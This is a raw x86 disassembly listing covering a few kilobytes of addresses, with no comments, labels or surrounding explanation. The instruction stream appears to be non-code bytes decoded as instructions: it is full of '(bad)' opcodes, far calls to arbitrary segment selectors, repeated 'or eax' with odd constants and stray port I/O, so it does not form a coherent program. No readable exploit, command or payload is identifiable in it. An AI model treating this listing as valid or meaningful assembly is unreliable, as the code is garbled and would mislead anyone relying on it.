  433b67:	or     eax,0xcd0df375
  433b6c:	call   0xd4c:0xcd179a56
  433b73:	jne    0x433bc1
  433b75:	pop    ss
  433b76:	jne    0x433bd5
  433b78:	or     eax,0x1cd85d75
  433b7d:	xchg   edx,eax
  433b7e:	pop    ss
  433b7f:	jne    0x433ba9
  433b81:	fcom   DWORD PTR [ebp-0x6d119ea0]
  433b87:	or     eax,0x17a26075
  433b8c:	jne    0x433bee
  433b8e:	or     eax,0x1cd82875
  433b93:	call   0x4c75:0xd287517
  433b9a:	xchg   ebx,eax
  433b9b:	repnz mov ds:0x4ccd0d8c,al
  433ba1:	xchg   ebx,eax
  433ba2:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433ba9:	pusha  
  433baa:	xchg   ebx,eax
  433bab:	fsub   DWORD PTR [esi+0x61]
  433bae:	popa   
  433baf:	popa   
  433bb0:	or     eax,0xa20d2875
  433bb5:	not    ebp
  433bb7:	bound  esp,QWORD PTR [edx+0x62]
  433bba:	fdiv   QWORD PTR [edx+0xd60ee5f]
  433bc0:	jne    0x433bea
  433bc2:	or     eax,0x62d5f7a2
  433bc7:	bound  esp,QWORD PTR [edx-0x24]
  433bca:	push   esi
  433bcb:	jne    0x433c2a
  433bcd:	pop    ss
  433bce:	jne    0x433c34
  433bd0:	or     eax,0xa20d2875
  433bd5:	not    ebp
  433bd7:	bound  esp,QWORD PTR [edx+0x62]
  433bda:	fmul   QWORD PTR ds:0x2c135dcd
  433be0:	push   0x58751792
  433be5:	fcom   DWORD PTR [ebp-0x6d119e07]
  433beb:	or     eax,0x17a2f975
  433bf0:	jne    0x433beb
  433bf2:	or     eax,0x1cd85875
  433bf7:	call   0x6475:0xd587517
  433bfe:	xchg   ebx,eax
  433bff:	repnz mov ds:0x64cd0d8c,al
  433c05:	xchg   ebx,eax
  433c06:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433c0d:	stc    
  433c0e:	xchg   ebx,eax
  433c0f:	fcom   DWORD PTR [edi]
  433c11:	popa   
  433c12:	popa   
  433c13:	popa   
  433c14:	or     eax,0xa20d5875
  433c19:	not    ebp
  433c1b:	bound  esp,QWORD PTR [edx+0x62]
  433c1e:	fdiv   QWORD PTR [edx+0xd60ee5f]
  433c24:	jne    0x433c7e
  433c26:	or     eax,0x62d5f7a2
  433c2b:	bound  esp,QWORD PTR [edx-0x24]
  433c2e:	push   esi
  433c2f:	jne    0x433c8e
  433c31:	pop    ss
  433c32:	jne    0x433c84
  433c34:	or     eax,0xa20d5875
  433c39:	not    ebp
  433c3b:	bound  esp,QWORD PTR [edx+0x62]
  433c3e:	fmul   QWORD PTR ds:0x2c135dcd
  433c44:	push   0x3c751792
  433c49:	fcom   DWORD PTR [ebp-0x6d119ee4]
  433c4f:	or     eax,0x17a21c75
  433c54:	jne    0x433c72
  433c56:	or     eax,0x1cd83c75
  433c5b:	call   0x5075:0xd3c7517
  433c62:	xchg   ebx,eax
  433c63:	repnz mov ds:0x50cd0d8c,al
  433c69:	xchg   ebx,eax
  433c6a:	repnz rol DWORD PTR [esi+0x75a11f56],1
  433c71:	sbb    al,0x73
  433c73:	mov    cs,WORD PTR ds:0xe3d83c75
  433c79:	mul    DWORD PTR [ecx-0x19]
  433c7c:	or     DWORD PTR ds:0xcd0d3c75,0xf7da565d
  433c86:	pop    ss
  433c87:	int    0x69
  433c89:	or     eax,0x610d6975
  433c8e:	push   esi
  433c8f:	jne    0x433ce6
  433c91:	or     eax,0x681769cd
  433c96:	out    dx,al
  433c97:	repnz lock int3 
  433c9a:	bound  esp,QWORD PTR [edx+0x62]
  433c9d:	lock sbb esp,DWORD PTR [ebx+0x62]
  433ca1:	bound  ebp,QWORD PTR [edi+0x2257a21c]
  433ca7:	xchg   BYTE PTR [ecx-0x5b],ah
  433caa:	or     eax,0x2c64d864
  433caf:	or     eax,0x75179275
  433cb4:	cmp    al,0xd
  433cb6:	jne    0x433cf4
  433cb8:	or     eax,0x61680cdb
  433cbd:	popa   
  433cbe:	fsubr  DWORD PTR [edx-0x27c4189f]
  433cc4:	jmp    0x1caf:0x3ab26186
  433ccb:	lock leave 
  433ccd:	push   0x750d6161
  433cd2:	cmp    al,0xd
  433cd4:	fisttp DWORD PTR [eax+ebp*2]
  433cd7:	popa   
  433cd8:	popa   
  433cd9:	or     eax,0x170d3ccd
  433cde:	or     al,0x68
  433ce0:	popa   
  433ce1:	popa   
  433ce2:	or     eax,0x56610d91
  433ce7:	cdq    
  433ce8:	xchg   esi,eax
  433ce9:	pop    ss
  433cea:	jne    0x433d34
  433cec:	or     eax,0xe3d88675
  433cf1:	jecxz  0x433d54
  433cf3:	mov    dl,0x9a
  433cf5:	scas   eax,DWORD PTR es:[edi]
  433cf6:	sbb    al,0xa2
  433cf8:	lock mov gs,WORD PTR [eax+0x61]
  433cfc:	popa   
  433cfd:	or     eax,0x1cd88675
  433d02:	jecxz  0x433d1b
  433d04:	jne    0x433d37
  433d06:	or     eax,0xcd0d3175
  433d0b:	call   0xdf9:0xcd179a56
  433d12:	jne    0x433d0d
  433d14:	or     eax,0x751792a2
  433d19:	sbb    BYTE PTR ds:0xcd0df975,cl
  433d1f:	call   0x5dcd:0x1776da56
  433d26:	or     eax,0xcd0df975
  433d2b:	call   0x60cd:0x17fbda56
  433d32:	or     eax,0xcd0df975
  433d37:	call   0xf3cd:0x178eda56
  433d3e:	fcom   DWORD PTR [ebp-0x6a279eb0]
  433d44:	dec    esp
  433d45:	popa   
  433d46:	or     eax,0xcd0df975
  433d4b:	stc    
  433d4c:	or     eax,0x99a77ea2
  433d51:	mov    al,ch
  433d53:	xchg   edi,eax
  433d54:	or     eax,0xa20df975
  433d59:	jle    0x433d72
  433d5b:	jne    0x433d7d
  433d5d:	out    dx,al
  433d5e:	xchg   ecx,eax
  433d5f:	or     eax,0xa20df975
  433d64:	mov    dl,BYTE PTR [edi]
  433d66:	jne    0x433d88
  433d68:	or     eax,0x75172075
  433d6d:	pop    eax
  433d6e:	fcom   DWORD PTR [ebp+0x3aee611c]
  433d74:	or     eax,0x17a21c75
  433d79:	jne    0x433d97
  433d7b:	or     eax,0x75a71c75
  433d80:	pop    eax
  433d81:	xchg   ebx,eax
  433d82:	fcom   DWORD PTR [ecx]
  433d84:	popa   
  433d85:	popa   
  433d86:	popa   
  433d87:	or     eax,0xcd0df975
  433d8c:	sbb    al,0xa7
  433d8e:	fidivr DWORD PTR [esi+0x73]
  433d91:	jl     0x433da0
  433d93:	jne    0x433db1
  433d95:	or     eax,0xa50d60cd
  433d9a:	call   0x64a5:0x17d67e56
  433da1:	or     eax,0xcd0d1c75
  433da6:	repz xchg ebx,eax
  433da8:	repnz neg DWORD PTR [ecx-0x11d78ae9]
  433daf:	cmp    ecx,DWORD PTR ds:0x75171c75
  433db5:	sub    BYTE PTR ds:0xcd0d2875,cl
  433dbb:	pop    ebp
  433dbc:	fcom   DWORD PTR [esi+0x5fb261d6]
  433dc2:	out    dx,al
  433dc3:	lods   eax,DWORD PTR ds:[esi]
  433dc4:	or     eax,0xcd0d2875
  433dc9:	pop    ebp
  433dca:	or     eax,0x7e569aa5
  433dcf:	(bad)  
  433dd0:	pop    ss
  433dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433dd2:	imul   ecx,DWORD PTR ds:0x75562875,0x55751718
  433ddc:	or     eax,0x75a76975
  433de1:	stc    
  433de2:	lds    esi,FWORD PTR [esi+0xd]
  433de5:	jne    0x433e18
  433de7:	or     eax,0xda56f9cd
  433dec:	mul    DWORD PTR [ecx-0x738c9633]
  433df2:	or     eax,0xcd0d2875
  433df7:	pop    ebp
  433df8:	or     eax,0x7517d6f7
  433dfd:	imul   ebp,esi,0x69750d93
  433e03:	sub    eax,0xcd0d9a75
  433e08:	sub    BYTE PTR ds:0xf7175da5,cl
  433e0e:	sbb    bl,al
  433e10:	jmp    0x1caf:0xf7b26169
  433e17:	out    dx,al
  433e18:	call   0xaf62:0x6262a4f0
  433e1f:	sbb    al,0xa2
  433e21:	push   edi
  433e22:	and    al,BYTE PTR [esi+0x640da561]
  433e28:	fsub   DWORD PTR [esi+esi*4+0x21]
  433e2c:	jne    0x433e6a
  433e2e:	lods   eax,DWORD PTR ds:[esi]
  433e2f:	loop   0x433e32
  433e31:	imul   esp,DWORD PTR [ecx],0xe2252875
  433e37:	add    DWORD PTR [ecx+0xd],ebp
  433e3a:	jne    0x433dce
  433e3c:	pop    ss
  433e3d:	jne    0x433e57
  433e3f:	or     eax,0xb853c75
  433e44:	call   0xa8e8:0x5e343ac9
  433e4b:	popa   
  433e4c:	pop    ss
  433e4d:	jne    0x433eb3
  433e4f:	and    DWORD PTR [ebp+0x5d],esi
  433e52:	push   edx
  433e53:	out    dx,al
  433e54:	enter  0xd56,0x75
  433e58:	cmp    al,0x85
  433e5a:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433e60:	call   0x755aa00d
  433e65:	repz or eax,0xb853c75
  433e6b:	call   0xa8e8:0x5e343ac9
  433e72:	popa   
  433e73:	pop    ss
  433e74:	jne    0x433ea7
  433e76:	or     eax,0xb853c75
  433e7b:	call   0xa8e8:0x5e343ac9
  433e82:	popa   
  433e83:	pop    ss
  433e84:	jne    0x433ed6
  433e86:	or     eax,0xb853c75
  433e8b:	call   0xa8e8:0x5e343ac9
  433e92:	popa   
  433e93:	pop    ss
  433e94:	jne    0x433eff
  433e96:	or     eax,0xb853c75
  433e9b:	call   0xa8e8:0x5e343ac9
  433ea2:	popa   
  433ea3:	pop    ss
  433ea4:	jne    0x433efb
  433ea6:	and    DWORD PTR [ebp+0x48],esi
  433ea9:	push   edx
  433eaa:	out    dx,al
  433eab:	enter  0xd56,0x75
  433eaf:	cmp    al,0x85
  433eb1:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433eb7:	call   0xcd50a064
  433ebc:	sbb    BYTE PTR ds:0x61680c17,cl
  433ec2:	popa   
  433ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ec4:	push   0x750d7be7
  433ec9:	cmp    al,0x85
  433ecb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433ed1:	call   0x75eaa07e
  433ed6:	xchg   bh,ah
  433ed8:	ror    DWORD PTR ds:0xdb0d1875,0xc
  433edf:	push   0xcd0d6161
  433ee4:	sbb    BYTE PTR ds:0x61680c17,cl
  433eea:	popa   
  433eeb:	or     eax,0x56610d91
  433ef0:	cdq    
  433ef1:	xchg   esi,eax
  433ef2:	pop    ss
  433ef3:	jne    0x433f4d
  433ef5:	or     eax,0xb853c75
  433efa:	call   0xa8e8:0x5e343ac9
  433f01:	popa   
  433f02:	or     eax,0xd6a186cd
  433f07:	(bad)  [ecx+0x61]
  433f0a:	popa   
  433f0b:	out    0x89,eax
  433f0d:	or     eax,0xcd0d8675
  433f12:	call   0x6161:0x61db0456
  433f19:	pop    ss
  433f1a:	int    0x5d
  433f1c:	out    dx,al
  433f1d:	mov    BYTE PTR ds:0xb852875,cl
  433f23:	call   0xa8e8:0x5e343ac9
  433f2a:	popa   
  433f2b:	lock adc edx,DWORD PTR [esi+0x61]
  433f2f:	popa   
  433f30:	out    dx,al
  433f31:	mov    BYTE PTR ds:0xb853c75,cl
  433f37:	call   0xa8e8:0x5e343ac9
  433f3e:	popa   
  433f3f:	lock ficom WORD PTR [esi+0x61]
  433f43:	popa   
  433f44:	and    DWORD PTR [ebp+0x4c],esi
  433f47:	lods   eax,DWORD PTR ds:[esi]
  433f48:	loop   0x433f4b
  433f4a:	imul   ebp,esi,0x48750d92
  433f50:	xor    esp,DWORD PTR [edi-0x18]
  433f53:	test   al,0x61
  433f55:	test   DWORD PTR [ebx],ecx
  433f57:	call   0xd4c:0x75173ac9
  433f5e:	jne    0x433fac
  433f60:	test   DWORD PTR [ebx],ecx
  433f62:	call   0xa8e8:0x5e343ac9
  433f69:	popa   
  433f6a:	pop    ss
  433f6b:	jne    0x433fb5
  433f6d:	or     eax,0x75a74875
  433f72:	dec    esp
  433f73:	out    0x7d,eax
  433f75:	or     eax,0x1c7b4875
  433f7a:	jle    0x433f89
  433f7c:	int    0x3c
  433f7e:	(bad)  
  433f7f:	outs   dx,DWORD PTR ds:[esi]
  433f80:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433f86:	pop    esi
  433f87:	call   0xa550a134
  433f8c:	pop    ebp
  433f8d:	mov    eax,ds:0x78b25f86
  433f92:	or     eax,0x1c7b4875
  433f97:	jle    0x433fa6
  433f99:	int    0x3c
  433f9b:	(bad)  
  433f9c:	outs   dx,DWORD PTR ds:[esi]
  433f9d:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433fa3:	pop    esi
  433fa4:	call   0xa550a151
  433fa9:	pop    ebp
  433faa:	mov    eax,ds:0x93925fc6
  433faf:	outs   dx,BYTE PTR ds:[esi]
  433fb0:	inc    esi
  433fb1:	pop    edi
  433fb2:	popa   
  433fb3:	popa   
  433fb4:	or     eax,0xb853c75
  433fb9:	call   0xa8e8:0x5e343ac9
  433fc0:	popa   
  433fc1:	pop    ss
  433fc2:	jne    0x43402d
  433fc4:	or     eax,0xb853c75
  433fc9:	call   0xa8e8:0x5e343ac9
  433fd0:	popa   
  433fd1:	pop    ss
  433fd2:	jne    0x434029
  433fd4:	or     eax,0x1c7b4875
  433fd9:	jle    0x434031
  433fdb:	jne    0x43403a
  433fdd:	pop    ss
  433fde:	jne    0x433fd9
  433fe0:	or     eax,0xcd0df975
  433fe5:	call   0x31cd:0x1792da56
  433fec:	or     eax,0xb853c75
  433ff1:	call   0xa8e8:0x5e343ac9
  433ff8:	popa   
  433ff9:	pop    ss
  433ffa:	jne    0x433fef
  433ffc:	or     eax,0xb853c75
  434001:	call   0xa8e8:0x5e343ac9
  434008:	popa   
  434009:	or     eax,0x68a1f9cd
  43400e:	out    0x97,eax
  434010:	or     eax,0xcd0df975
  434015:	call   0xdf3:0xcd179a56
  43401c:	jne    0x43405a
  43401e:	test   DWORD PTR [ebx],ecx
  434020:	call   0xdf9:0xcd0d3ac9
  434027:	rol    DWORD PTR [esi+0x5e9a6e13],1
  43402d:	call   0x7599a1da
  434032:	call   0x1c75:0x13507517
  434039:	pop    ss
  43403a:	jne    0x43409c
  43403c:	or     eax,0x61216075
  434041:	sub    edx,esp
  434043:	add    DWORD PTR [ecx+0x62],ebp
  434046:	mov    dl,0x50
  434048:	or     eax,0xdb0d1875
  43404d:	dec    eax
  43404e:	push   0x92626161
  434053:	pop    ss
  434054:	jne    0x4340bf
  434056:	or     eax,0xb853c75
  43405b:	call   0xa8e8:0x5e343ac9
  434062:	popa   
  434063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434064:	jne    0x4340cf
  434066:	mov    dl,0x88
  434068:	bound  esi,QWORD PTR [edx+0x18750d50]
  43406e:	or     eax,0x616848db
  434073:	popa   
  434074:	(bad)
  434079:	imul   esp,DWORD PTR [ecx],0x874d1475
  43407f:	xchg   esp,eax
  434080:	fcom   QWORD PTR [ebx]
  434082:	jne    0x434098
  434084:	pop    ss
  434085:	jne    0x4340a7
  434087:	or     eax,0x61212075
  43408c:	(bad)  
  43408d:	cmc    
  43408e:	add    DWORD PTR [ecx+0xd],ebp
  434091:	jne    0x4340cf
  434093:	test   DWORD PTR [ebx],ecx
  434095:	call   0xa8e8:0x5e343ac9
  43409c:	popa   
  43409d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43409e:	jne    0x434109
  4340a0:	mov    dl,0xaf
  4340a2:	or     eax,0xb852875
  4340a7:	call   0x1355:0xcd0d3ac9
  4340ae:	outs   dx,BYTE PTR ds:[esi]
  4340af:	push   0x61a8e85e
  4340b4:	pop    ss
  4340b5:	jne    0x43410c
  4340b7:	or     eax,0xb851475
  4340bc:	call   0xa8e8:0x5e343ac9
  4340c3:	popa   
  4340c4:	xchg   ebx,eax
  4340c5:	mov    edx,0xdd25575
  4340ca:	jne    0x4340e4
  4340cc:	or     eax,0x616848db
  4340d1:	popa   
  4340d2:	(bad)
  4340d7:	cmp    al,0x85
  4340d9:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4340df:	call   0x75eaa28c
  4340e4:	imul   esi,DWORD PTR [edx+0x1c750d6a],0xc99a0b85
  4340ee:	cmp    dh,BYTE PTR [esi+ebx*2]
  4340f1:	call   0x75e4a29e
  4340f6:	push   ebp
  4340f7:	xchg   ebx,eax
  4340f8:	mov    ch,0xda
  4340fa:	bound  esp,QWORD PTR [edx+0x62]
  4340fd:	or     eax,0xb853c75
  434102:	call   0xa8e8:0x5e343ac9
  434109:	popa   
  43410a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43410b:	jne    0x434176
  43410d:	mov    dl,0x80
  43410f:	or     eax,0xb852875
  434114:	call   0x1364:0xcd0d3ac9
  43411b:	outs   dx,BYTE PTR ds:[esi]
  43411c:	push   0x61a8e85e
  434121:	pop    ss
  434122:	jne    0x434188
  434124:	lock retf 0x6168
  434128:	popa   
  434129:	and    DWORD PTR [ebp+0x8],esi
  43412c:	pusha  
  43412d:	xchg   DWORD PTR [eax-0x528ade98],ecx
  434133:	push   edx
  434134:	xor    esi,edi
  434136:	mov    WORD PTR ds:0xb853c75,cs
  43413c:	call   0xa8e8:0x5e343ac9
  434143:	popa   
  434144:	pop    ss
  434145:	jne    0x4340f8
  434147:	out    dx,al
  434148:	imul   ecx,DWORD PTR ds:0xb852875,0xffffff9a
  43414f:	leave  
  434150:	cmp    cl,BYTE PTR ds:0x6e13b1cd
  434156:	push   0x61a8e85e
  43415b:	pop    ss
  43415c:	jne    0x43410f
  43415e:	or     eax,0xb853c75
  434163:	call   0xa8e8:0x5e343ac9
  43416a:	popa   
  43416b:	or     eax,0xa50db1cd
  434170:	xor    DWORD PTR [ecx+0x6e931af7],esp
  434176:	cmp    ch,BYTE PTR [eax+0x61]
  434179:	popa   
  43417a:	or     eax,0xb853c75
  43417f:	call   0xa8e8:0x5e343ac9
  434186:	popa   
  434187:	pop    ss
  434188:	jne    0x434192
  43418a:	or     eax,0xb853c75
  43418f:	call   0xa8e8:0x5e343ac9
  434196:	popa   
  434197:	pop    ss
  434198:	jne    0x434147
  43419a:	or     eax,0xb853c75
  43419f:	call   0xa8e8:0x5e343ac9
  4341a6:	popa   
  4341a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341a8:	jne    0x43419d
  4341aa:	out    0x86,eax
  4341ac:	or     eax,0xcd0db175
  4341b1:	repz or eax,0x7517d6f7
  4341b7:	or     BYTE PTR ds:0xcd0db175,cl
  4341bd:	xor    DWORD PTR ds:0x7517d6f7,ecx
  4341c3:	lods   eax,DWORD PTR ds:[esi]
  4341c4:	or     eax,0xb853c75
  4341c9:	call   0xa8e8:0x5e343ac9
  4341d0:	popa   
  4341d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341d2:	jne    0x4341dc
  4341d4:	out    0xa2,eax
  4341d6:	or     eax,0xb853c75
  4341db:	call   0xa8e8:0x5e343ac9
  4341e2:	popa   
  4341e3:	or     eax,0x3fd608cd
  4341e8:	popa   
  4341e9:	popa   
  4341ea:	popa   
  4341eb:	fisttp DWORD PTR [edx+0x47]
  4341ee:	xchg   DWORD PTR [edi+0x4a],edx
  4341f1:	inc    edi
  4341f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341f3:	pop    ds
  4341f4:	out    0xfb,eax
  4341f6:	or     eax,0x62d50875
  4341fb:	bound  esp,QWORD PTR [ecx+0x61]
  4341fe:	xchg   ebx,eax
  4341ff:	repnz sbb al,0xd2
  434202:	bound  esi,QWORD PTR [edx+0x18750d69]
  434208:	or     eax,0x616848db
  43420d:	popa   
  43420e:	(bad)  
  434210:	call   0xd79:0xeead7517
  434217:	jne    0x4341b3
  434219:	push   esi
  43421a:	jne    0x4341c9
  43421c:	pop    ss
  43421d:	jne    0x434243
  43421f:	or     eax,0xa2a22475
  434224:	shl    BYTE PTR [edx-0x4e],cl
  434227:	imul   ecx,DWORD PTR ds:0xdb0d1875,0x61616848
  434231:	(bad)  
  434233:	call   0x3c75:0xdad7517
  43423a:	test   DWORD PTR [ebx],ecx
  43423c:	call   0xa8e8:0x5e343ac9
  434243:	popa   
  434244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434245:	jne    0x4341f4
  434247:	mov    dl,0x8b
  434249:	or     eax,0xb852875
  43424e:	call   0x1364:0xcd0d3ac9
  434255:	outs   dx,BYTE PTR ds:[esi]
  434256:	push   0x61a8e85e
  43425b:	pop    ss
  43425c:	jne    0x4342c2
  43425e:	out    dx,al
  43425f:	jbe    0x43426e
  434261:	jne    0x43428b
  434263:	test   DWORD PTR [ebx],ecx
  434265:	call   0xa8e8:0x5e343ac9
  43426c:	popa   
  43426d:	or     eax,0xba93adcd
  434272:	pop    ds
  434273:	or     eax,0xa50db1cd
  434278:	xor    DWORD PTR [edi],edx
  43427a:	neg    DWORD PTR [edx]
  43427c:	lock pusha 
  43427e:	arpl   WORD PTR [edx+0x62],sp
  434281:	lock and DWORD PTR [ebp+0x62],edx
  434285:	bound  ecx,QWORD PTR ds:0xb853c75
  43428b:	call   0xa8e8:0x5e343ac9
  434292:	popa   
  434293:	mov    eax,ds:0x88e76475
  434298:	or     eax,0xb853c75
  43429d:	call   0xa8e8:0x5e343ac9
  4342a4:	popa   
  4342a5:	pop    ss
  4342a6:	jne    0x4342fc
  4342a8:	out    dx,al
  4342a9:	xchg   edx,eax
  4342aa:	or     eax,0xb852875
  4342af:	call   0xa8e8:0x5e343ac9
  4342b6:	popa   
  4342b7:	pop    ss
  4342b8:	jne    0x43430e
  4342ba:	or     eax,0x22575475
  4342bf:	xchg   BYTE PTR [ecx-0x5b],ah
  4342c2:	or     eax,0xa264d864
  4342c7:	and    DWORD PTR [ebp+0x69],esi
  4342ca:	lods   eax,DWORD PTR ds:[esi]
  4342cb:	loop   0x4342ce
  4342cd:	imul   esp,DWORD PTR [ecx],0xe2255d75
  4342d3:	add    DWORD PTR [ecx+0xd],ebp
  4342d6:	jne    0x43425e
  4342d8:	pop    ss
  4342d9:	jne    0x434330
  4342db:	or     eax,0x69750d1c
  4342e0:	test   DWORD PTR [ebx],ecx
  4342e2:	call   0xa8e8:0x5e343ac9
  4342e9:	popa   
  4342ea:	mov    eax,ds:0x6e939a75
  4342ef:	mov    bh,0x68
  4342f1:	popa   
  4342f2:	popa   
  4342f3:	or     eax,0xcd0d9a75
  4342f8:	call   0x31cd:0x1796da56
  4342ff:	and    DWORD PTR [ebp+0x64],esi
  434302:	sub    edx,esp
  434304:	add    DWORD PTR [ecx+0xd],ebp
  434307:	jne    0x43436d
  434309:	test   DWORD PTR [ebx],ecx
  43430b:	call   0xd669:0xcd0d3ac9
  434312:	outs   dx,DWORD PTR ds:[esi]
  434313:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434319:	pop    esi
  43431a:	call   0xa550a4c7
  43431f:	xor    DWORD PTR [ecx-0xa2dddf0],esp
  434325:	add    eax,0x956e9368
  43432a:	push   0x750d6161
  43432f:	xor    DWORD PTR ds:0x4569acd,ecx
  434335:	std    
  434336:	popa   
  434337:	popa   
  434338:	popa   
  434339:	pop    ss
  43433a:	int    0x18
  43433c:	or     eax,0xcd0d9a75
  434341:	xor    DWORD PTR ds:0x75179e99,ebp
  434347:	repz or eax,0xb856975
  43434d:	call   0xa8e8:0x5e343ac9
  434354:	popa   
  434355:	mov    eax,ds:0x6e93f375
  43435a:	sahf   
  43435b:	push   0x750d6161
  434360:	imul   eax,DWORD PTR [ebp+0x3ac99a0b],0xa8e85e34
  43436a:	popa   
  43436b:	pop    ss
  43436c:	jne    0x4343b6
  43436e:	and    DWORD PTR [ebp+0x3c],esi
  434371:	and    esp,edx
  434373:	add    DWORD PTR [ecx+0xd],ebp
  434376:	jne    0x434390
  434378:	or     eax,0x7517f7a2
  43437d:	push   eax
  43437e:	out    dx,al
  43437f:	xchg   ecx,eax
  434380:	or     eax,0xa20d1875
  434385:	not    DWORD PTR [edi]
  434387:	jne    0x4343d9
  434389:	or     eax,0xb856975
  43438e:	call   0xa8e8:0x5e343ac9
  434395:	popa   
  434396:	mov    eax,ds:0x6e935075
  43439b:	gs popa 
  43439d:	popa   
  43439e:	popa   
  43439f:	or     eax,0xb856975
  4343a4:	call   0xa8e8:0x5e343ac9
  4343ab:	popa   
  4343ac:	pop    ss
  4343ad:	jne    0x4343d7
  4343af:	out    dx,al
  4343b0:	cmp    cl,BYTE PTR ds:0x17a22875
  4343b6:	jne    0x4343e0
  4343b8:	or     eax,0xf3d85075
  4343bd:	call   0x9328:0x75a1f34f
  4343c4:	fdiv   st,st(5)
  4343c6:	popa   
  4343c7:	popa   
  4343c8:	popa   
  4343c9:	or     eax,0xcd0d2875
  4343ce:	sbb    BYTE PTR [ebx-0x6566d30e],dl
  4343d4:	aad    0x62
  4343d6:	xchg   ebx,eax
  4343d7:	popa   
  4343d8:	popa   
  4343d9:	pop    ss
  4343da:	jne    0x4343d5
  4343dc:	or     eax,0x610d1875
  4343e1:	or     eax,0x6e13f9cd
  4343e6:	call   0xb85:0x62531334
  4343ed:	call   0xd58:0x75173ac9
  4343f4:	jne    0x43441e
  4343f6:	or     eax,0xf29318cd
  4343fb:	sub    al,0x99
  4343fd:	call   0x4c75:0x1786691f
  434404:	or     eax,0xb855875
  434409:	call   0x139a:0xcd0d3ac9
  434410:	outs   dx,BYTE PTR ds:[esi]
  434411:	push   0x61a8e85e
  434416:	pop    ss
  434417:	jne    0x434479
  434419:	or     eax,0xcd0d4c75
  43441e:	cmp    al,0xd6
  434420:	outs   dx,DWORD PTR ds:[esi]
  434421:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434427:	pop    esi
  434428:	call   0x1feaa5d5
  43442d:	out    0xf7,eax
  43442f:	out    dx,al
  434430:	fucomi st,st(6)
  434432:	aaa    
  434433:	or     eax,0xcd0d4c75
  434438:	cmp    al,0xd6
  43443a:	outs   dx,DWORD PTR ds:[esi]
  43443b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  434441:	pop    esi
  434442:	call   0x1feaa5ef
  434447:	mov    dl,0x8f
  434449:	or     eax,0x75176075
  43444e:	sbb    al,0xd
  434450:	jne    0x43446e
  434452:	or     eax,0xf3755661
  434457:	or     eax,0x68171ccd
  43445c:	lock shl BYTE PTR [edx+0x62],cl
  434460:	bound  ecx,QWORD PTR ds:0x75564875
  434466:	push   eax
  434467:	pop    ss
  434468:	jne    0x4344b2
  43446a:	or     eax,0xcd0d4875
  43446f:	fs (bad) 
  434471:	outs   dx,DWORD PTR ds:[esi]
  434472:	or     ebx,DWORD PTR [edx-0x5af2c537]
  434478:	xor    DWORD PTR [edi-0xa41b192],esp
  43447e:	add    eax,0xee5fe868
  434483:	mov    WORD PTR ds:0x75561875,cs
  434489:	push   eax
  43448a:	pop    ss
  43448b:	jne    0x4344a5
  43448d:	lock in eax,dx
  43448f:	arpl   WORD PTR [edx+0x62],sp
  434492:	or     eax,0xb855d75
  434497:	call   0xa8e8:0x5e343ac9
  43449e:	popa   
  43449f:	out    dx,al
  4344a0:	lea    ecx,ds:0xb856975
  4344a6:	call   0xa8e8:0x5e343ac9
  4344ad:	popa   
  4344ae:	push   edi
  4344af:	and    bl,BYTE PTR [edx+0x640da561]
  4344b5:	(bad)  
  4344b6:	fs pop ebp
  4344b8:	push   0x75216161
  4344bd:	mov    cl,0xad
  4344bf:	loop   0x4344c2
  4344c1:	imul   esp,DWORD PTR [ecx],0xe225fd75
  4344c7:	add    DWORD PTR [ecx+0xd],ebp
  4344ca:	jne    0x43447d
  4344cc:	test   DWORD PTR [ebx],ecx
  4344ce:	call   0xa8e8:0x5e343ac9
  4344d5:	popa   
  4344d6:	pop    ss
  4344d7:	jne    0x434501
  4344d9:	or     eax,0xb85b175
  4344de:	call   0xa8e8:0x5e343ac9
  4344e5:	popa   
  4344e6:	pop    ss
  4344e7:	jne    0x4344f1
  4344e9:	or     eax,0x7517fb75
  4344ee:	and    BYTE PTR [ebx],dl
  4344f0:	jne    0x4344e5
  4344f2:	pop    ss
  4344f3:	jne    0x434511
  4344f5:	or     eax,0x610d1c75
  4344fa:	or     eax,0x1faff3cd
  4344ff:	or     eax,0x68171ccd
  434504:	or     eax,0x610d1c75
  434509:	xor    edx,edx
  43450b:	sar    BYTE PTR [edi+0x1ccd0d3a],1
  434511:	pop    ss
  434512:	push   0x175d7513
  434517:	jne    0x43456d
  434519:	or     eax,0x610d5475
  43451e:	or     eax,0x1faf5dcd
  434523:	or     eax,0x681754cd
  434528:	or     eax,0x610d5475
  43452d:	xor    edx,DWORD PTR [edx+0xd3abfe1]
  434533:	int    0x54
  434535:	pop    ss
  434536:	push   0x17ad7513
  43453b:	jne    0x434536
  43453d:	or     eax,0x610df975
  434542:	or     eax,0x1fafadcd
  434547:	or     eax,0x6817f9cd
  43454c:	or     eax,0x610df975
  434551:	xor    ebp,DWORD PTR [ecx+eiz*8]
  434554:	mov    edi,0xf9cd0d3a
  434559:	pop    ss
  43455a:	push   0x17507513
  43455f:	jne    0x434575
  434561:	or     eax,0x610d1475
  434566:	or     eax,0x1faf50cd
  43456b:	or     eax,0x681714cd
  434570:	or     eax,0x610d1475
  434575:	xor    edx,edx
  434577:	addr16 inc eax
  434579:	cmp    cl,BYTE PTR ds:0x681714cd
  43457f:	and    DWORD PTR [ebp+0x55],esi
  434582:	ret    0x1fa
  434585:	imul   ebx,eax,0xe7619aea
  43458b:	cmp    al,bl
  43458d:	jmp    0xead8:0x78e76186
  434594:	mov    ah,BYTE PTR [ecx-0x19]
  434597:	jbe    0x4345a6
  434599:	jne    0x434535
